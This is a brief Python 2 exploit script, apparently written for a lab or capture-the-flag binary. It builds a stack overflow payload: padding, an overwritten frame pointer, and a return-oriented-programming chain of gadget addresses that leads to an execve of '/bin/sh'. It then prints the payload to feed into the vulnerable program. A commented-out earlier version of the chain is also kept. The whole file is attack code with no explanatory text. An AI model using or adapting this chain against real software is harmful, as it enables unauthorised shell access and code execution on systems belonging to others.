filling = 'a' * 108
ebp = ("\xf8\xf9\xfe\xbf")
retxoreax = ("\x50\x17\x05\x08")
retxoredx = ("\xcb\xe7\x08\x08")
popecxpopebxret = ("\x61\x73\x05\x08")
popeaxret = ("\xbb\x5d\x08\x08")
fillzero = ("\xd2\x97\x04\x08")
popedxret = ("\x3a\x73\x05\x08")


shellcodeaddr = ("\x3c\xfa\xfe\xbf")
junk = ("\x90\x90\x90\x90")
parray = ("\x3c\xfa\xfe\xbf")
path = ("\x44\xfa\xfe\xbf")
interrupt = ("\x70\x5d\x05\x08")

sub1 = ("\x1f\xff\xff\x06")
sub2 = ("\x2a\xff\xff\x06")
subecxeaxret = ("\xbf\xae\x0b\x08")

liftesp = chr(0x90) * 44
somewhereplus18 = ("\x28\xfa\xfe\xbf")
#print filling + ebp + retxoredx + junk + junk + popecxpopebxret + sub1 + junk + popeaxret + sub2 + subecxeaxret + junk + popecxpopebxret + #parray + path +  interrupt + 'a' * 40 + path + "/bin/sh"

print filling + ebp + retxoreax + popedxret + somewhereplus18 + fillzero + retxoredx + junk + junk + popecxpopebxret + sub1 + junk + popeaxret + sub2 + subecxeaxret + junk + popecxpopebxret + parray + path + interrupt + 'a' * 24 + path + junk + "/bin/sh"
